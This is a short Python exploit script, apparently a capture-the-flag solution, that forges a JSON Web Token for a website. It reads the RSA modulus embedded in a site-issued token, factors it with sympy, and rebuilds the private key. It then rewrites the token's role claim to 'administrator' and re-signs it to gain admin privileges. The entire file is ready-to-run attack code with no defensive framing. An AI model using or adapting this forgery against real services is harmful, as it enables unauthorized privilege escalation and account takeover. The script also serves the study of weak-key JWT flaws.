import base64
import json
from Crypto.PublicKey import RSA
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
import sympy
import time
import jwt

# input jwt gen'd by site
token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImRpZTJAZm9vLmNvbSIsInJvbGUiOiJjdXN0b21lcl9mYzM4MTkxYyIsImlhdCI6MTcyODM1OTYxOCwiZXhwIjoxNzI4MzYzMjE4LCJqd2siOnsia3R5IjoiUlNBIiwibiI6IjExMTc5ODk2NTgwMDM1NzgwMzQzOTM1ODc0NzU0ODMzNjU5NDk2ODA2OTg0OTMzODE0MDQyNjg0NTUyMDg1NTg3NzU1NzAxMzY2OTg1MDQ0MDYzMjYxNjk2MTc2MjA1ODEwMTQyOTMxNjE5NjQ3NjU5NTIwNDcyOTI1MzU1OTk1Nzc1MTA4NjQ4NTIyMjkyMjcwNjk3MDg2ODQ0MjAyODczMDc4NDYzNjQ2NjkwODk3MTA3MTY2NTQxNjI5OTY4MTk4MzYxNDYzNzExMjU3NjEwNzQxOTExMDE4ODI1MDcxNDI5ODExNjcxMzU5ODI3OTg5NTI0MTQwNzc3MzYwMzE5MzUzODU1NzYwODY5MTI5MDY2Mjk5Mjc0OTU2NTMxNDc3NzYxNDI0MTk0Mzc4MzQxNjQyOTAxOTAzMyIsImUiOjY1NTM3fX0.Bc8H5Iguhy3KyNEGVHcSitUe0ZT6_Uf6QIHJUucZRNC-9SelY-ucu_74P-xWKY-TgjEpumshKCeiYpwf7fcx9GvbN8s5OcUj5EBugW7s93DTWn9OAoByuomSv4rN7WxJ0QP7imbWB_LR6qV5MxqGVv_rIuT6syI8O7kfICPNE4Fx2Fg"

# REMOVE PADDING FOR DECODING
def add_padding(b64_str):
    while len(b64_str) % 4 != 0:
        b64_str += '='
    return b64_str
# Decode our token to modify it
def base64url_decode(input):
    input = add_padding(input)
    input = input.replace('-', '+').replace('_', '/')
    return base64.b64decode(input)

# load raw values of our token
js = json.loads(base64url_decode(token.split(".")[1]).decode())
# load our prime and derive p and q from it
n = int(js["jwk"]['n'])
p, q = list((sympy.factorint(n)).keys())
e = 65537
phi_n = (p - 1) * (q - 1)
d = pow(e, -1, phi_n)
key_data = {'n': n, 'e': e, 'd': d, 'p': p, 'q': q}
key = RSA.construct((key_data['n'], key_data['e'], key_data['d'], key_data['p'], key_data['q']))
private_key_bytes = key.export_key()
private_key = serialization.load_pem_private_key(
    private_key_bytes,
    password=None,
    backend=default_backend()
)
public_key = private_key.public_key()

# if current_role is None or ("customer" not in current_role and "administrator" not in current_role):
# we want administrator in the jwk

# drop da admin in da payload
data = jwt.decode(token, public_key, algorithms=["RS256"])
data["role"] = "administrator"
new_token = jwt.encode(data, private_key, algorithm="RS256")
print(new_token)
